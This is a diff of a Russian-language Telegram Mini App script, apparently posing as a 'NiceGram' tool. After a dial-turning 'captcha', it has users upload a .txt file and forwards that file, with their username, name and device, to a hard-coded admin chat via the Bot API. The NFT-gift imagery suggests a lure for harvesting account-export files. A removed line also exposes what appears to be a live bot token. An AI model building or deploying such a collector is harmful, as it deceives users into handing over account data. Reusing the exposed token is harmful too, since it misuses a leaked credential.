@@ -2,13 +2,25 @@ const tg = window.Telegram.WebApp;
 tg.expand();
 
 // --- НАСТРОЙКИ МИНИ-АПА ---
-const BOT_TOKEN = "8567185651:AAFx8TIPf4nEle-hGT25sfip20dB7m0VT1I"; // ДОЛЖЕН БЫТЬ ТАКИМ ЖЕ КАК В БОТЕ
+const BOT_TOKEN = "ТВОЙ_ТОКЕН_БОТА";
 const ADMIN_ID = "7632180689";
+
+// Ссылки на фоновые изображения
+const BACKGROUND_IMAGES = [
+    "https://static6.tgstat.ru/channels/_0/7c/7c8536637e62010b627a43f09fe8a469.jpg",
+    "https://cache.tonapi.io/imgproxy/emGFD8G3jt41AkBJLS2ygiHlTP20aCPP_tN0O7j_9aA/rs:fill:1500:1500:1/g:no/aHR0cHM6Ly9uZnQuZnJhZ21lbnQuY29tL2dpZnQvY3J5c3RhbGJhbGwtNDk0LndlYnA.webp",
+    "https://i.getgems.io/cj6OL84WRNDlEU1STgJv-6EComaWdEiyGa3ueSBHvzw/rs:fill:1000:0:1/g:ce/czM6Ly9nZXRnZW1zLXMzL25mdC1jb250ZW50LWNhY2hlL2ltYWdlcy9FUURMN0hNYmNhMEZ1ZnJqSEZjUm9pTGtFaU9Ya1hvT192SDJnVlVOOEpOcDRraEsvNjgzMDZjMTkyYWNjMDU3Mw",
+    "https://yt3.googleusercontent.com/v5uMoct16G7gneNFzOx71EZHam15nxmcxpcovXNMRMM0UtxsGq0IWn5ZcLmQ0pGgOIuGHBSTmFY=s900-c-k-c0x00ffffff-no-rj"
+];
 // -------------------------
 
 let angle = 0;
 let isDragging = false;
+let targetAngle = 0;
+let targetStart = 0;
+let targetEnd = 0;
 
+// Элементы
 const circle = document.getElementById('circle');
 const degreeTxt = document.getElementById('degree');
 const captchaScreen = document.getElementById('captcha-screen');
@@ -16,6 +28,127 @@ const mainScreen = document.getElementById('main-screen');
 const statusMsg = document.getElementById('status-msg');
 const deviceInfo = document.getElementById('device-info');
 const welcomeUser = document.getElementById('welcome-user');
+const degreeMarks = document.getElementById('degree-marks');
+const targetHint = document.getElementById('target-hint');
+
+// Создаем циферблат с градусами
+function createDegreeMarks() {
+    for (let i = 0; i < 360; i += 10) {
+        const mark = document.createElement('div');
+        mark.className = 'degree-mark';
+        mark.textContent = i;
+        mark.style.transform = `rotate(${i}deg) translate(115px) rotate(-${i}deg)`;
+        degreeMarks.appendChild(mark);
+    }
+}
+
+// Генерация случайного целевого угла с погрешностью 10°
+function generateTargetAngle() {
+    // Случайный угол от 0 до 350
+    targetAngle = Math.floor(Math.random() * 36) * 10;
+    
+    // Погрешность ±10°
+    targetStart = targetAngle - 10;
+    targetEnd = targetAngle + 10;
+    
+    // Корректировка для перехода через 0°
+    if (targetStart < 0) {
+        targetStart += 360;
+    }
+    if (targetEnd > 360) {
+        targetEnd -= 360;
+    }
+    
+    // Обновляем подсказку
+    let hintText = `Поверните стрелку в диапазон: `;
+    
+    if (targetStart > targetEnd) {
+        // Диапазон проходит через 0°
+        hintText += `0°-${targetEnd}° ИЛИ ${targetStart}°-360°`;
+    } else {
+        // Обычный диапазон
+        hintText += `${targetStart}°-${targetEnd}°`;
+    }
+    
+    targetHint.textContent = hintText;
+    
+    // Подсвечиваем нужные градусы на циферблате
+    highlightTargetRange();
+}
+
+// Подсветка целевого диапазона
+function highlightTargetRange() {
+    // Сначала снимаем подсветку со всех меток
+    const marks = document.querySelectorAll('.degree-mark');
+    marks.forEach(mark => mark.classList.remove('target-range'));
+    
+    // Подсвечиваем метки в целевом диапазоне
+    marks.forEach(mark => {
+        const markAngle = parseInt(mark.textContent);
+        
+        if (targetStart > targetEnd) {
+            // Диапазон через 0°
+            if (markAngle >= 0 && markAngle <= targetEnd) {
+                mark.classList.add('target-range');
+            }
+            if (markAngle >= targetStart && markAngle <= 360) {
+                mark.classList.add('target-range');
+            }
+        } else {
+            // Обычный диапазон
+            if (markAngle >= targetStart && markAngle <= targetEnd) {
+                mark.classList.add('target-range');
+            }
+        }
+    });
+}
+
+// Проверка попадания в целевой диапазон
+function isInTargetRange(currentAngle) {
+    if (targetStart > targetEnd) {
+        // Диапазон проходит через 0°
+        return (currentAngle >= 0 && currentAngle <= targetEnd) || 
+               (currentAngle >= targetStart && currentAngle <= 360);
+    } else {
+        // Обычный диапазон
+        return currentAngle >= targetStart && currentAngle <= targetEnd;
+    }
+}
+
+// Создаем плавающие фоновые изображения
+function createFloatingImages() {
+    const container = document.getElementById('floating-bg');
+    
+    // Распределяем изображения равномерно по экрану
+    const positions = [
+        {top: '10%', left: '10%', animationDelay: '0s'},
+        {top: '20%', left: '70%', animationDelay: '5s'},
+        {top: '60%', left: '20%', animationDelay: '10s'},
+        {top: '70%', left: '60%', animationDelay: '15s'}
+    ];
+    
+    BACKGROUND_IMAGES.forEach((src, index) => {
+        const img = document.createElement('img');
+        img.className = 'floating-img';
+        img.src = src;
+        img.alt = '';
+        
+        // Настройка размеров
+        const isMobile = window.innerWidth < 480;
+        img.style.width = isMobile ? '60px' : '80px';
+        img.style.height = isMobile ? '60px' : '80px';
+        
+        // Позиционирование
+        img.style.top = positions[index].top;
+        img.style.left = positions[index].left;
+        img.style.animationDelay = positions[index].animationDelay;
+        
+        // Разные скорости анимации
+        img.style.animationDuration = (20 + Math.random() * 10) + 's';
+        
+        container.appendChild(img);
+    });
+}
 
 // Определение устройства
 function detectPlatform() {
@@ -36,22 +169,17 @@ function detectPlatform() {
         deviceType = "💻 Linux";
     }
     
-    // Обновляем информацию об устройстве
     deviceInfo.innerHTML = `
         <strong>📱 Устройство:</strong> ${deviceType}<br>
-        <strong>🌐 Платформа:</strong> ${platform}<br>
-        <small>ID: ${tg.initDataUnsafe?.user?.id || 'Неизвестно'}</small>
+        <strong>🌐 Платформа:</strong> ${platform}
     `;
     
     return { deviceType, platform };
 }
 
-// Логика вращения стрелки (оптимизировано для мобильных)
+// Логика вращения стрелки
 function handleRotation(e) {
     if (!isDragging) return;
-    
-    // Предотвращаем скролл на мобильных
-    e.preventDefault();
     
     const clientX = e.touches ? e.touches[0].clientX : e.clientX;
     const clientY = e.touches ? e.touches[0].clientY : e.clientY;
@@ -65,217 +193,129 @@ function handleRotation(e) {
     if (angle < 0) angle += 360;
     
     circle.style.transform = `rotate(${angle}deg)`;
-    degreeTxt.innerText = `${angle}°`;
+    degreeTxt.textContent = `${angle}°`;
     
-    // Изменение цвета при приближении к цели
-    if (angle >= 80 && angle <= 99) {
-        circle.style.background = 'linear-gradient(135deg, #00aaff, #0066ff)';
-        circle.style.boxShadow = '0 0 45px rgba(0, 170, 255, 0.8), inset 0 2px 0 rgba(255, 255, 255, 0.3)';
-        degreeTxt.style.color = '#66ffff';
-        degreeTxt.style.textShadow = '0 0 20px rgba(102, 255, 255, 0.9)';
+    // Подсветка при попадании в диапазон
+    if (isInTargetRange(angle)) {
+        circle.style.background = 'linear-gradient(135deg, #00aa00, #006600)';
+        circle.style.boxShadow = '0 0 25px #00ff00';
+        degreeTxt.style.color = '#00ff00';
     } else {
-        circle.style.background = 'linear-gradient(135deg, #0066ff, #0033cc)';
-        circle.style.boxShadow = '0 0 30px rgba(0, 102, 255, 0.6), inset 0 2px 0 rgba(255, 255, 255, 0.3)';
-        degreeTxt.style.color = '#66ccff';
-        degreeTxt.style.textShadow = '0 0 15px rgba(102, 204, 255, 0.7)';
+        circle.style.background = 'linear-gradient(135deg, #008800, #004400)';
+        circle.style.boxShadow = '0 0 15px rgba(0, 255, 0, 0.4)';
+        degreeTxt.style.color = '#00ff00';
     }
 }
 
 // Инициализация событий вращения
-circle.addEventListener('mousedown', () => {
-    isDragging = true;
-    circle.style.cursor = 'grabbing';
-});
-
-circle.addEventListener('touchstart', (e) => {
-    e.preventDefault();
-    isDragging = true;
-    circle.style.cursor = 'grabbing';
-});
-
+circle.addEventListener('mousedown', () => isDragging = true);
+circle.addEventListener('touchstart', () => isDragging = true);
 window.addEventListener('mousemove', handleRotation);
 window.addEventListener('touchmove', handleRotation, {passive: false});
+window.addEventListener('mouseup', () => isDragging = false);
+window.addEventListener('touchend', () => isDragging = false);
 
-window.addEventListener('mouseup', () => {
-    isDragging = false;
-    circle.style.cursor = 'grab';
-});
-
-window.addEventListener('touchend', () => {
-    isDragging = false;
-    circle.style.cursor = 'grab';
-});
-
-// Кнопка подтверждения капчи
+// Кнопка подтверждения
 document.getElementById('verify-btn').onclick = () => {
-    // Проверка попадания в диапазон 80-99 градусов
-    if (angle >= 80 && angle <= 99) {
-        // Виброотклик
+    if (isInTargetRange(angle)) {
+        // Успешная проверка
         if (tg.HapticFeedback) {
-            tg.HapticFeedback.impactOccurred('soft');
+            tg.HapticFeedback.impactOccurred('light');
         }
         
-        // Плавный переход
-        captchaScreen.style.opacity = '0';
-        captchaScreen.style.transform = 'translateY(-20px)';
+        captchaScreen.classList.add('hidden');
+        mainScreen.classList.remove('hidden');
         
-        setTimeout(() => {
-            captchaScreen.classList.add('hidden');
-            mainScreen.classList.remove('hidden');
-            mainScreen.classList.add('fade-in');
-            
-            // Приветствие пользователя
-            const firstName = tg.initDataUnsafe?.user?.first_name || "Пользователь";
-            const username = tg.initDataUnsafe?.user?.username 
-                ? `@${tg.initDataUnsafe.user.username}` 
-                : "без username";
-            
-            welcomeUser.innerText = `👋 Добро пожаловать, ${firstName}!`;
-            
-            // Определение устройства
-            detectPlatform();
-            
-            // Анимация появления
-            mainScreen.style.opacity = '0';
-            mainScreen.style.transform = 'translateY(20px)';
-            
-            setTimeout(() => {
-                mainScreen.style.opacity = '1';
-                mainScreen.style.transform = 'translateY(0)';
-            }, 50);
-        }, 300);
+        const firstName = tg.initDataUnsafe?.user?.first_name || "Пользователь";
+        welcomeUser.textContent = `Добро пожаловать, ${firstName}`;
+        
+        detectPlatform();
     } else {
-        // Ошибка с виброоткликом
+        // Неправильный угол
         if (tg.HapticFeedback) {
             tg.HapticFeedback.impactOccurred('heavy');
         }
-        
-        alert("❌ Неверно! Поверните стрелку вправо в диапазон 80°-99°");
+        alert("❌ Неверно! Поверните стрелку в указанный диапазон.");
     }
 };
 
-// Выбор и отправка файла
+// Отправка файла
 const fileInput = document.getElementById('file-input');
-document.getElementById('select-file-btn').onclick = () => {
-    // Виброотклик при нажатии
-    if (tg.HapticFeedback) {
-        tg.HapticFeedback.selectionChanged();
-    }
-    fileInput.click();
-};
+document.getElementById('select-file-btn').onclick = () => fileInput.click();
 
 fileInput.onchange = async () => {
     const file = fileInput.files[0];
     if (!file) return;
 
-    // 1. Проверка: только TXT файлы
+    // Проверка расширения
     if (!file.name.toLowerCase().endsWith('.txt')) {
-        statusMsg.className = "status active error";
-        statusMsg.innerHTML = "❌ <strong>Ошибка:</strong> Разрешены только файлы с расширением .txt!";
-        
-        // Сброс input
-        fileInput.value = ""; 
-        
-        // Виброотклик ошибки
-        if (tg.HapticFeedback) {
-            tg.HapticFeedback.impactOccurred('heavy');
-        }
-        return;
-    }
-
-    // 2. Проверка размера файла (максимум 10MB)
-    if (file.size > 10 * 1024 * 1024) {
-        statusMsg.className = "status active error";
-        statusMsg.innerHTML = "❌ <strong>Ошибка:</strong> Файл слишком большой! Максимум 10MB.";
+        alert("Ошибка: Разрешены только .txt файлы!");
         fileInput.value = "";
         return;
     }
 
-    // 3. Подготовка статуса
     statusMsg.className = "status active";
-    statusMsg.innerHTML = '<span class="loader"></span> Отправка файла...';
+    statusMsg.textContent = "⏳ Отправка файла...";
 
-    // 4. Сбор данных
+    // Сбор данных
     const user = tg.initDataUnsafe?.user || {};
     const username = user.username ? `@${user.username}` : "Скрыт";
     const firstName = user.first_name || "Пользователь";
-    const userId = user.id || "Неизвестно";
-    
-    // Определение устройства
     const { deviceType, platform } = detectPlatform();
-    
-    // 5. Подготовка FormData
+
     const formData = new FormData();
     formData.append('chat_id', ADMIN_ID);
     formData.append('document', file);
     
-    // Подробная подпись
-    const caption = `📄 <b>Файл:</b> ${file.name}\n` +
-                   `👤 <b>Юзер:</b> ${username}\n` +
-                   `👨 <b>Имя:</b> ${firstName}\n` +
-                   `🆔 <b>ID:</b> <code>${userId}</code>\n` +
-                   `📱 <b>Устройство:</b> ${deviceType}\n` +
-                   `🌐 <b>Платформа:</b> ${platform}\n` +
-                   `📊 <b>Размер:</b> ${(file.size / 1024).toFixed(2)} KB\n` +
-                   `⏰ <b>Время:</b> ${new Date().toLocaleString('ru-RU')}`;
+    const caption = `📄 Файл: ${file.name}\n` +
+                   `👤 Юзер: ${username}\n` +
+                   `👨 Имя: ${firstName}\n` +
+                   `📱 Устройство: ${deviceType}\n` +
+                   `🌐 Платформа: ${platform}`;
     
     formData.append('caption', caption);
-    formData.append('parse_mode', 'HTML');
 
     try {
-        // 6. Отправка через Telegram Bot API
         const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
             method: 'POST',
             body: formData
         });
 
-        const data = await response.json();
-
-        if (response.ok && data.ok) {
-            // Успех
+        if (response.ok) {
             statusMsg.className = "status active success";
-            statusMsg.innerHTML = "✅ <strong>Успешно!</strong> Файл доставлен администратору.";
-            
-            // Виброотклик успеха
+            statusMsg.textContent = "✅ Файл успешно доставлен!";
             if (tg.HapticFeedback) {
                 tg.HapticFeedback.notificationOccurred('success');
             }
-            
-            // Автоматический сброс через 5 секунд
-            setTimeout(() => {
-                statusMsg.className = "status";
-                fileInput.value = "";
-            }, 5000);
-            
         } else {
-            // Ошибка Telegram API
+            const errorData = await response.json();
             statusMsg.className = "status active error";
-            const errorMsg = data.description || 'Неизвестная ошибка';
-            statusMsg.innerHTML = `❌ <strong>Ошибка API:</strong> ${errorMsg}`;
-            
-            if (tg.HapticFeedback) {
-                tg.HapticFeedback.notificationOccurred('error');
-            }
+            statusMsg.textContent = `❌ Ошибка: ${errorData.description || 'Неизвестная ошибка'}`;
         }
     } catch (err) {
-        // Ошибка сети
         statusMsg.className = "status active error";
-        statusMsg.innerHTML = "❌ <strong>Ошибка сети:</strong> Проверьте соединение.";
-        console.error('Ошибка отправки:', err);
+        statusMsg.textContent = "❌ Ошибка сети. Проверьте соединение.";
     }
 };
 
 // Инициализация при загрузке
-tg.ready();
-detectPlatform();
+window.addEventListener('load', () => {
+    tg.ready();
+    createDegreeMarks();
+    generateTargetAngle();
+    createFloatingImages();
+    detectPlatform();
+    
+    console.log(`Бот запущен. Целевой диапазон: ${targetStart}°-${targetEnd}°`);
+});
 
-// Фикс для мобильного фона - гарантируем черный фон
-document.body.style.backgroundColor = "#000";
-document.documentElement.style.backgroundColor = "#000";
-
-// Логирование для отладки
-console.log(`NiceGram Mini-App запущен
-Пользователь: ${tg.initDataUnsafe?.user?.first_name || 'Неизвестно'}
-Платформа: ${tg.platform}
-Версия: ${tg.version}
-Цветовая тема: ${tg.colorScheme}`);
+// Адаптация размеров изображений при изменении окна
+window.addEventListener('resize', () => {
+    const imgs = document.querySelectorAll('.floating-img');
+    const isMobile = window.innerWidth < 480;
+    
+    imgs.forEach(img => {
+        img.style.width = isMobile ? '60px' : '80px';
+        img.style.height = isMobile ? '60px' : '80px';
+    });
+});
